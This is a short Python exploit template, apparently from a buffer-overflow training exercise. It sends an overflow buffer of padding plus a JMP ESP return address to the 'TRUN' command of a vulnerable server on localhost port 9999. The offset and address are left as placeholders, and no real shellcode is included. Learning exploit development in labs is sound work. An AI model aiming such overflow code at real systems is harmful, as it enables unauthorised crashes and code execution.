import socket
 
offset  = <YOUR_OFFSET>            # value from msf-pattern_offset
jmp_esp = b"<JMP_ESP_BYTES>"      # little-endian bytes of your JMP ESP address
 
shellcode = b"A" * offset + jmp_esp
 
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("127.0.0.1", 9999))
s.recv(1024)
s.send(b"TRUN /.:/ " + shellcode + b"\r\n")
s.close()
